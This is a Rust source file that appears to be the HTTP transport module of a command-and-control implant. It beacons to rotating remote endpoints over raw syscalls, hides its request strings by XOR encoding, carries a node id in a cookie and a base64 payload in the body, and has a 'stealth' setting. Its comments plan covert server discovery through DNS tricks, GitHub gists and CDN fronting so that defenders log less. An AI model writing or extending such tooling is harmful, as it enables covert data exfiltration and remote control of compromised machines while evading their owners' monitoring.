use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use super::{Channel, ChannelInfo, Latency, SendContext};
use crate::strings;
use crate::sys;

pub struct HTTPChannel {
    endpoints: Vec<String>,
    current: std::sync::atomic::AtomicUsize,
    info: ChannelInfo,
}

impl HTTPChannel {
    pub fn new(endpoints: Vec<String>) -> Result<Self, Box<dyn std::error::Error>> {
        Ok(HTTPChannel {
            endpoints,
            current: std::sync::atomic::AtomicUsize::new(0),
            info: ChannelInfo {
                name: "https",
                max_payload: 1 << 20,
                bidirectional: true,
                confirmed: true,
                stealth: 1,
                latency: Latency::Realtime,
            },
        })
    }

    fn next_endpoint(&self) -> &str {
        let idx = self.current.load(std::sync::atomic::Ordering::Relaxed);
        &self.endpoints[idx % self.endpoints.len()]
    }

    fn advance_endpoint(&self) {
        self.current.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    fn parse_host_port(endpoint: &str) -> (&str, u16) {
        let https_scheme = strings::decode_str(strings::HTTPS_SCHEME);
        let http_scheme = strings::decode_str(strings::HTTP_SCHEME);

        let without_scheme = endpoint
            .strip_prefix(&https_scheme)
            .or_else(|| endpoint.strip_prefix(&http_scheme))
            .unwrap_or(endpoint);

        if let Some(pos) = without_scheme.rfind(':') {
            let port = without_scheme[pos + 1..]
                .trim_end_matches('/')
                .parse::<u16>()
                .unwrap_or(80);
            let host = &without_scheme[..pos];
            (host, port)
        } else {
            let host = without_scheme.trim_end_matches('/');
            if endpoint.starts_with(&https_scheme) {
                (host, 443)
            } else {
                (host, 80)
            }
        }
    }
}

impl Channel for HTTPChannel {
    fn info(&self) -> &ChannelInfo {
        &self.info
    }

    fn send(&self, ctx: &SendContext) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
        let endpoint = self.next_endpoint();
        let (host, port) = Self::parse_host_port(endpoint);

        let key_id_hex = hex::encode(ctx.key_id);
        let payload_b64 = BASE64.encode(&ctx.payload);
        let body = format!("{}{}", key_id_hex, payload_b64);

        // will have to put a lot of thought into the dns portion here.
        // lot of options, doh to a popular dns like 1.1.1.1
        // piggyback on existing resolvers
        // query a dns server we control for a popular domain but return our own ips
        // encode the ip into a legitimate looking github gist or repo
        // host behind a popular cdn or a pointer file behind a popular cdn
        // lot of trade-offs and ease of logging at each step
        // will think of other creative solutions for this soon
        // Resolve hostname
        let addr = sys::resolve(host, port)?;

        // Create socket via raw syscall
        let fd = match sys::socket_tcp() {
            Ok(fd) => fd,
            Err(e) => {
                self.advance_endpoint();
                return Err(e.into());
            }
        };

        // Connect via raw syscall
        if let Err(e) = sys::connect_tcp(fd, &addr) {
            let _ = sys::close(fd);
            self.advance_endpoint();
            return Err(e.into());
        }

        // Set read timeout
        let _ = sys::set_read_timeout(fd, 30);

        // Build request from XOR-encoded strings
        let mut req = Vec::with_capacity(256 + body.len());
        req.extend_from_slice(&strings::decode(strings::POST_LINE));
        req.extend_from_slice(&strings::decode(strings::HOST_PREFIX));
        req.extend_from_slice(host.as_bytes());
        req.extend_from_slice(&strings::decode(strings::CRLF));
        req.extend_from_slice(&strings::decode(strings::CONTENT_TYPE_HEADER));
        req.extend_from_slice(&strings::decode(strings::CONTENT_LENGTH));
        req.extend_from_slice(body.len().to_string().as_bytes());
        req.extend_from_slice(&strings::decode(strings::CRLF));
        req.extend_from_slice(&strings::decode(strings::COOKIE_PREFIX));
        req.extend_from_slice(ctx.node_id.as_bytes());
        req.extend_from_slice(&strings::decode(strings::CRLF));
        req.extend_from_slice(&strings::decode(strings::CONNECTION_CLOSE));
        req.extend_from_slice(&strings::decode(strings::CRLF));
        req.extend_from_slice(body.as_bytes());

        // Write via raw syscall
        if let Err(e) = sys::write_all(fd, &req) {
            let _ = sys::close(fd);
            return Err(e.into());
        }

        // Read response via raw syscall
        let mut response = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            match sys::read(fd, &mut buf) {
                Ok(0) => break,
                Ok(n) => response.extend_from_slice(&buf[..n]),
                Err(_) => break,
            }
        }

        let _ = sys::close(fd);

        // Extract body from response
        if let Some(pos) = find_header_end(&response) {
            let resp_body = &response[pos..];
            if resp_body.is_empty() {
                Ok(None)
            } else {
                Ok(Some(resp_body.to_vec()))
            }
        } else {
            Ok(None)
        }
    }
}

/// Find \r\n\r\n in response bytes without using string conversion.
fn find_header_end(data: &[u8]) -> Option<usize> {
    for i in 0..data.len().saturating_sub(3) {
        if data[i] == b'\r'
            && data[i + 1] == b'\n'
            && data[i + 2] == b'\r'
            && data[i + 3] == b'\n'
        {
            return Some(i + 4);
        }
    }
    None
}